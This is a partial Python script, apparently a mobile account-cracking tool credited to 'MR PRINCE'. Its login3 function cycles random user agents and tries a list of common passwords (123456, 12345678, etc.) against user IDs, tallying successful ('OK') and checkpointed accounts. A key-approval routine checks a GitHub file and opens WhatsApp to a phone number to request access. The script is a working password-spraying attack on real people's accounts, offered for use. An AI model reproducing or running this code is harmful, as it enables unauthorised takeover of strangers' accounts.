...
\33[38;5;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mDEVELOPER   \33[38;5;160m▶  \033[1;97mMR PRINCE
\33[38;5;160m[\033[1;97mᯤ\33[38;5;160m] \033[1;97mGITHUB      \33[38;5;160m▶  \033[1;97mMR PRINCE
...
def login3(uid):
    ...
    Session=requests.session()
    try:
        sys.stdout.write(f'\r\r\33[38;5;37m[\x1b[38;5;46mTABBU\33[38;5;37m-\x1b[38;5;46mS3\33[38;5;37m]\033[1;97m-\33[38;5;37m[\033[1;97m{loop}\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46mOK\33[38;5;160m/\x1b[38;5;208mCP\33[38;5;37m]\033[1;97m-\33[38;5;37m[\x1b[38;5;46m{len(oks)}\33[38;5;160m/\x1b[38;5;208m{len(cps)}\33[38;5;37m]')
        sys.stdout.flush()
        ua = random.choice(ugen)
        ua = windows()
        for pw in ["123456","1234567","12345678","123456789","111222"]:
...
def meyexudi():
  ...
  uuid = "MR"+str(os.getuid())+"PRINCE"+str(os.getuid())+"FREE.TOOL"
  id = ''.join(uuid)
  try:
    httpCaht = requests.get(f"https://github.com/BROKEN-PRINCE//blob/main/approval.txt").text
    if id in httpCaht:
      msg = str(os.geteuid())
      print()
      pass
      ...
      os.system('espeak -a 300 " Assalamualaikum,   I,   Am,    Robot,   of,   PRINCE,   KING ,    Please,   Send,   Your,   Key,"')
      print(" \x1b[0m║══[KEY]  : "+id)
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+917543864229?text='+tks),approval()       
  except:
    sys.exit()
print(logo)
meyexudi()
